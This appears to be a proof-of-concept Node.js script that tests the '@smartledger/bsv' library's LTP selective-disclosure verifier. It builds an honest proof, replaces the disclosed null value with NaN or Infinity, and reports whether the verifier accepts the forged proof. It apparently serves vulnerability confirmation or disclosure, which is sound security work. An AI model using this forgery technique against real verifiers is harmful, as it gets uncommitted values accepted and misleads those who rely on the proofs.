// Execute the LTP selective-disclosure forgery through the PUBLIC API: build an honest
// proof disclosing `null`, then substitute NaN / Infinity for the disclosed value and ask
// the verifier again.  A `true` means a verifier accepts a value the issuer never committed.
//   usage: node forgery.js <installdir>
var name = process.argv[3] || '@smartledger/bsv'
var pkgdir = process.argv[2] + '/node_modules/' + name
var version = require(pkgdir + '/package.json').version
var LTP = require(pkgdir + '/lib/ltp/proof')
var NONCE = 'nonce123'

function verdict (proof) {
  try {
    var r = LTP.prepareSelectiveDisclosureVerification(proof, NONCE)
    if (!r.success) return 'error'
    return r.verification.valid === true
  } catch (e) { return 'throw' }
}

var out = [name + '@' + version]
try {
  var r = LTP.prepareSelectiveDisclosure({ claim: { x: null } }, ['claim.x'], NONCE)
  if (!r.success) throw new Error(r.error)
  var proof = r.proof || r
  out.push('honest=' + verdict(proof))
  for (var sub of [NaN, Infinity]) {
    var p = JSON.parse(JSON.stringify(proof))
    p.disclosures[0].value = sub
    out.push(String(sub) + '_accepted=' + verdict(p))
  }
} catch (e) { out.push('SETUP FAILED: ' + e.message.slice(0, 60)) }
console.log(out.join('  '))
